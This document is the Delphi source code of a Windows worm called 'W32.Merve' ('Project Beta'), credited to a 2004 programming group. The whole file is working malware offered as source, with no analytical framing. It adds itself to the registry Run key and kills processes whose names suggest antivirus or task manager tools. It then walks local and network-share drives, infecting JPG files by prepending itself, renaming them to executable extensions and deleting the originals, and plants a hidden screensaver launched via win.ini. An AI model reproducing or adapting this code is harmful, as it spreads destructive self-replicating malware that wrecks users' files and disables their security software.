   { **************************************************************************** }
   {                                                                              }
   {                 Name            : Project Beta                               }
   {                 Version         : 1.0                                        }
   {                 Start Date      : 17.02.2004                                 }
   {                                                                              }
   {                 Copyright :                                                  }
   {                 Niklaus / Rnp Programming And Security Group                 }
   {                                                                              }
   {                 Greetz :                                                     }
   {                 Positron                                                     }
   {                                                                               }
   {                 Additions : Thread (28.02.2004)                              }
   {                                                                              }
   { **************************************************************************** }
   {$A+,B-,C-,D-,E-,F-,G+,H+,I-,J-,K-,L-,M-,N+,O+,P+,Q-,R-,S-,T-,U-,V+,W-,X+,Y-,Z1}
   {$MINSTACKSIZE $00004000}
   {$MAXSTACKSIZE $00100000}
   {$IMAGEBASE $00400000}
   { **************************************************************************** }
   Program PrjBeta;
   {$R Icon.Res}
   { **************************************************************************** }
   Uses
     Windows,
     TlHelp32;
   Type
    TApplication = Class (TObject)
     Private
     FClosing : Boolean;
     mHandle : THandle;
     Function ControlOneInstance(MutexName:String):Boolean;{Mutex}
     Procedure DeleteInstance;
     Public
      Constructor Create;
      Destructor Destroy; override;
      Procedure Run;
      Procedure Close;
    End;

   Const{Constants - Sabitler }
   MutexName = 'W32.Merve';
   RegName = 'PrjBeta';
   PrName = 'Gizem.exe';
   HedefUz='jpg';                                                {Target Extention}
   SolucanUz='12288';                                        {Compressed Worm Size}
   MaxUzSayi = 4;

   Var{Variants - Degiskenler}
   Uzanti : Array [1..MaxUzSayi] Of String =(                          {Extentions}
   '.exe',
   '.scr',
   '.pif',
   '.bat'
   );
   Var
     Application : TApplication;
     Sonuc1 : String;                                    {Main App : Windir+PrName}
     hThread   : THandle;
     ThreadId  : LongWord;
   { **************************************************************************** }
   {$I sysutils.inc}
   // Others.inc
   function ShellExecute(hWnd: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer):integer;
   stdcall; external 'shell32.dll' name 'ShellExecuteA';
   Function Windizin:String; {Windows Directory}
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;
   Procedure AutoStart(WormLocation,RegAdi:String);
   Var
   HndKey : Hkey;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\Run',1,KEY_ALL_ACCESS,HndKey);
   RegSetValueEx(hndKey,Pchar(RegAdi),0,REG_SZ,Pchar(WormLocation),Length(WormLocation));
   RegCloseKey(hndKey);
   End;
   Function RandomStr(i: integer): String;
   Var
   k,Tmp: Integer;
   Harf,Str: String;
   Begin
   str:='';
   Harf:='QWERTYUIOPASDFGHJKLZXCVBNMqwertyuopasdfghjklizxcvbnm';
   Randomize;
   For k:=1 To i Do
   Begin
    Tmp:=Random(Length(Harf));
    If Tmp = 0 Then Tmp:=1;
    Str:=Str+Harf[Tmp];
   End;
   Result:=Str;
   End;
   Function UpperCase(Txt:String):String;
   Var
   i1:Integer;
   Begin
   Result:='';
   For i1:=0 To Length(Txt) Do
   Begin
   If (Ord(Txt[i1])>=97) And (Ord(Txt[i1])<=122)Then
   Txt[i1]:=Chr(Ord(Txt[i1])-32);
   End;
   Result:=Txt;
   End;
   Function TempDizin:String; {Temp Directory}
   Var
   i:Word;
   TpDizin:Array[1..MAX_PATH] Of Char;
   Begin
   ZeroMemory(@TpDizin[1],MAX_PATH);
   GetTempPath(MAX_PATH,@TpDizin);
   i:=0;
   Repeat
   Inc(i);
   Result:=Result+TpDizin[i];
   Until TpDizin[i+1]=Chr(0);
   End;
   Procedure BulSil(Klasor,Ext:String); {Try to Delete "*.Ext" on a Folder}
   Var
   Bulunan: TSearchRec;
   Begin
   If Klasor[Length(Klasor)]<>'\' Then Klasor:=Klasor+'\';
   If FindFirst (Klasor+'*.'+Ext , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Try
    DeleteFile(Pchar(Klasor+Bulunan.Name));
    Except
    End;
    Until FindNext(Bulunan)<>0;
   End;
   End;
   function StrEnd(const Str: PChar): PChar; assembler;
   asm
           MOV     EDX,EDI
           MOV     EDI,EAX
           MOV     ECX,0FFFFFFFFH
           XOR     AL,AL
           REPNE   SCASB
           LEA     EAX,[EDI-1]
           MOV     EDI,EDX
   end;
   function FileSetAttr(const FileName: string; Attr: Integer): Integer;
   begin
     Result := 0;
     if not SetFileAttributes(PChar(FileName), Attr) then
       Result := GetLastError;
   end;
   function FileGetAttr(const FileName: string): Integer;
   begin
     Result := GetFileAttributes(PChar(FileName));
   end;
   Function KillTask(ExeFileName: string): Integer;
   const
     PROCESS_TERMINATE = $0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     Result := 0;
     FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

     while Integer(ContinueLoop) <> 0 do
     begin
       if ((UpperCase(String(FProcessEntry32.szExeFile)) =
         UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
         UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(
                           OpenProcess(PROCESS_TERMINATE,
                                       BOOL(0),
                                       FProcessEntry32.th32ProcessID),
                                       0));
        ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;
   Procedure AvFwKill;
   var
     Proc   : TProcessEntry32;
     Snap   : THandle;
     Kelime : String;
   Begin
     Snap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS,0);
     Proc.dwSize := SizeOf(TProcessEntry32);
     Process32First(Snap,Proc);
     Repeat
      Kelime:=String(Proc.szExeFile);
      If (Pos('AV',UpperCase(Kelime)) <> 0) Or (Pos('SCAN',UpperCase(Kelime)) <> 0) Or (Pos('TASK',UpperCase(Kelime)) <> 0) Or (Pos('REG',UpperCase(Kelime)) <> 0) Then Begin Killtask(Kelime); Sleep(1000); End;
     Until (not Process32Next(Snap,Proc));
   End;
   //
   { **************************************************************************** }
   Procedure Parcala(Uz1 :Integer; KaynakDosya, Cikti1, Cikti2: String);
   Var
   FromF,ToF1,ToF2:File;
   Okunan,Yazilan,Tmp:Integer;
   Buf: array[1..1024] of Char;
   Uygun:Boolean;
   Begin
    FileMode:=2;
    AssignFile(FromF, KaynakDosya);
    Reset(FromF, 1);
   If FileSize(FromF) > Uz1 Then
   Begin
    {$I-}
    AssignFile(ToF1, Cikti1);
    ReWrite(ToF1, 1);
    CloseFile(ToF1);
    Uygun:= (IOResult = 0);
    {$I+}
   If Uygun Then
   Begin
    AssignFile(ToF1, Cikti1);
    ReWrite(ToF1, 1);
   End;
    AssignFile(ToF2, Cikti2);
    Rewrite(ToF2, 1);

    Tmp:=0;

     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       If Uygun Then BlockWrite(ToF1, Buf, Okunan, Yazilan);
       Tmp:=Tmp+Okunan;
     until (Tmp>Uz1-1);
     Seek(FromF,Uz1);
     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       BlockWrite(ToF2, Buf, Okunan, Yazilan);
     until (Okunan = 0) or (Yazilan <> Okunan);

   If Uygun Then CloseFile(ToF1);
     CloseFile(ToF2);
     CloseFile(FromF);
   End Else
   Begin
    If Not FileExists(Windizin+PrName) Then
    CopyFile(pchar(ParamStr(0)),pchar(Windizin+PrName), FALSE);
    CloseFile(FromF);
   End;
   End;

   //

   Constructor TApplication.Create;
   Var
   Sonuc2,KaynakDosya:String;
   Begin
   FClosing := False;
   Randomize;
   Sonuc1:=Windizin+PrName;
   Sonuc2:=TempDizin+RandomStr(6)+'.'+HedefUz;
   KaynakDosya:=TempDizin+RandomStr(6)+'.Tmp';

   If (ControlOneInstance(MutexName)) Then FClosing := True;
   If (UpperCase(ParamStr(0)) <> UpperCase(Sonuc1)) Then
   Begin
    FClosing := True;
    BulSil(TempDizin,'Tmp');
    BulSil(TempDizin,HedefUz);
    If FileExists(Sonuc1) Then DeleteFile(Pchar(Sonuc1));
    If FileExists(Sonuc2) Then DeleteFile(Pchar(Sonuc2));
    CopyFile(pchar(ParamStr(0)),Pchar(KaynakDosya), False);
    Parcala(12288, KaynakDosya, Sonuc1, Sonuc2);
    DeleteFile(Pchar(KaynakDosya));
    AutoStart(Sonuc1,Regname);
    If FileExists(Sonuc2) Then ShellExecute(GetDesktopWindow, 'open',PChar(Sonuc2), nil, nil, 0);
    If FileExists(Sonuc1) Then ShellExecute(GetDesktopWindow, 'open',PChar(Sonuc1), nil, nil, 0);
   End;
   End;

   Destructor TApplication.Destroy;
   Begin
     DeleteInstance;
     inherited;
   End;

   Procedure Birlestir(Dosya2S:String);
   Var
    HedefDosya1:String;
    Dosya2,HedefDosya:File;
    Okunan,Yazilan:Integer;
    Buf: array[1..2048] of Char;
    Uygun : Boolean;
    Attr:Integer;
   Begin
   Attr:= FileGetAttr(Dosya2S);
   If (Attr And faReadOnly)=0 Then
   Begin
    {$I-}
    AssignFile(Dosya2, Dosya2S);
    Reset(Dosya2, 1);
    CloseFile(Dosya2);
    Uygun:= (IOResult = 0);
    {$I+}
   If Uygun Then
   Begin

    HedefDosya1:=Dosya2S+'.Tmp';
    FileMode:=2;
    CopyFile(Pchar(ParamStr(0)),Pchar(HedefDosya1), FALSE);

    AssignFile(Dosya2, Dosya2S);
    Reset(Dosya2, 1);
    AssignFile(HedefDosya, HedefDosya1);
    Reset(HedefDosya, 1);

    Seek(HedefDosya,12288);
    Repeat
     BlockRead(Dosya2, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);

    CloseFile(HedefDosya);
    CloseFile(Dosya2);
    Randomize;
    CopyFile(Pchar(HedefDosya1),Pchar(Dosya2S+Uzanti[Random(MaxUzSayi)+1]), FALSE);
    DeleteFile(Pchar(HedefDosya1));
    DeleteFile(Pchar(Dosya2S));
   End;
   End Else
   FileSetAttr(Dosya2S, Attr - faReadOnly);
   End;


   Procedure BulBulas(Klasor:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If DirectoryExists(Klasor) Then
   Begin
   If Klasor[Length(Klasor)]<>'\' Then Klasor:=Klasor+'\';
   {******************************************************************************}
     If FindFirst (Klasor+'*.'+HedefUz , faAnyFile, Bulunan) = 0 Then
     Begin
      Repeat
      Birlestir(Klasor+Bulunan.Name);
      Until FindNext(Bulunan)<>0;
     End;
   {******************************************************************************}
     If FindFirst(Klasor+'*.*', faDirectory,Bulunan) = 0 Then
     Repeat
      If (Bulunan.Name <> '.') and (Bulunan.Name <> '..') and (Bulunan.Attr=faDirectory) Then
      Begin
      BulBulas(Klasor+Bulunan.Name);
      End;
     Until FindNext(Bulunan)<> 0;
     FindClose(Bulunan);
   End;
   End;
   Procedure WinIniAra(Klasor:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If Klasor[Length(Klasor)]<>'\' Then Klasor:=Klasor+'\';

   If FindFirst (Klasor+'win.ini' , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Begin
    If Not FileExists(Klasor+'Merve.Scr') Then CopyFile(Pchar(ParamStr(0)),Pchar(Klasor+'Merve.Scr'),False);
    SetFileAttributes(PChar(Klasor+'Merve.Scr'),FILE_ATTRIBUTE_HIDDEN);
    WritePrivateProfileString ('windows','run',Pchar('Merve.Scr'),Pchar(Klasor+Bulunan.Name));
    End;
    Until FindNext(Bulunan)<>0;
   End;
    If FindFirst(Klasor+'*.*', faDirectory,Bulunan) = 0 Then
    Repeat
     If (Bulunan.Name <> '.') and (Bulunan.Name <> '..') and (Bulunan.Attr=faDirectory) Then
     Begin
     WinIniAra(Klasor+Bulunan.Name);
     End;
    Until FindNext(Bulunan)<> 0;
    FindClose(Bulunan);
   End;

   Procedure BulasSuruculer;
   Var
     Buffer : Array [0..500] of Char;
     Temp   : PChar;
     Tip    : integer;
     Sonuc  : String;
   Begin
     Sonuc:='';
     GetLogicalDriveStrings(Sizeof(Buffer), Buffer);
     Temp := Buffer;
     While temp[0] <> #0 do
     Begin
       tip := GetDriveType( temp );
         Case Tip of
           DRIVE_FIXED  : Begin BulBulas(Temp);WinIniAra(Temp); End;
           DRIVE_REMOTE : Begin BulBulas(Temp);WinIniAra(Temp); End;
         End;
       temp := StrEnd(temp) + 1;
     End;
   End;
   Function NetHazirla(Pnr:PNetResource):Boolean;
   Type
   NetResArray=Array [0.. 1000] Of TNetResource;
   PNetResArray=^NetResArray;
   Var
   PnrLocal:PNetResource;
   BufBoyut,dwResult,Entries,dwResultEnum:Dword;
   hEnum:THandle;
   i:Integer;
   PnrLocalArr:PNETRESARRAY;
   Tmp1:TNetResource;
   Begin
   dwResult := WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,Pnr,hEnum);
   BufBoyut:=16384;
   Entries:=$FFFFFFFF;
   If (dwResult <> NO_ERROR) Then
   Begin
    Result:=False;
    Exit;
   End;

   Repeat
    PnrLocal := PNetResource(GlobalAlloc(GPTR, BufBoyut));
    dwResultEnum := WNetEnumResource(hEnum,Entries,PnrLocal,BufBoyut);
    If (dwResultEnum = NO_ERROR) Then
    Begin
     For i := 0 To Entries-1 Do
     Begin
     PnrLocalArr:=PNetResArray(PnrLocal);
     Tmp1:=PnrLocalArr[i];

     If ((Tmp1.dwUsage And RESOURCEUSAGE_CONNECTABLE)<>0)
     And (Tmp1.dwType=RESOURCETYPE_DISK)
     And (Tmp1.dwDisplayType=RESOURCEDISPLAYTYPE_SHARE)
     Then
     Begin
     BulBulas(Tmp1.lpRemoteName);
     WinIniAra(Tmp1.lpRemoteName);
     End;
     If(RESOURCEUSAGE_CONTAINER =(PnrLocalArr[i].dwUsage And RESOURCEUSAGE_CONTAINER))
     Then NetHazirla(@PnrLocalArr[i]);
     End;
    End;
   Until dwResultEnum = ERROR_NO_MORE_ITEMS ;
   GlobalFree(THandle(PnrLocal));
   dwResult := WNetCloseEnum(hEnum);
   If (dwResult <> NO_ERROR) Then
   Begin
    Result:=False;
    Exit;
   End;
   Result:=true;
   End;

   Procedure KazaaInfect;
   Begin
   hThread:=BeginThread(NIL,0,@BulasSuruculer,NIL,0,ThreadId);;
   NetHazirla(Nil);
   End;

   Procedure TApplication.Run;
   Begin
   AvFwKill;
   AutoStart(Sonuc1,RegName);
   KazaaInfect;
   //Islem
   End;


   Procedure TApplication.Close;
   Begin
   PostQuitMessage(0);
   End;

   Function TApplication.ControlOneInstance(MutexName:String):Boolean;
   Begin
   Result:=False;
   mHandle := CreateMutex(nil, True, PAnsiChar(MutexName));
     If GetLastError = ERROR_ALREADY_EXISTS then
     Begin
       Result:=True;
     End;
   End;
   Procedure TApplication.DeleteInstance;
   Begin
   If mHandle <> 0 Then CloseHandle(mHandle)
   End;

   Begin
     Application := TApplication.Create;
     If Not Application.FClosing Then Application.Run
     Else Application.Close;
     Application.Free;
   End.

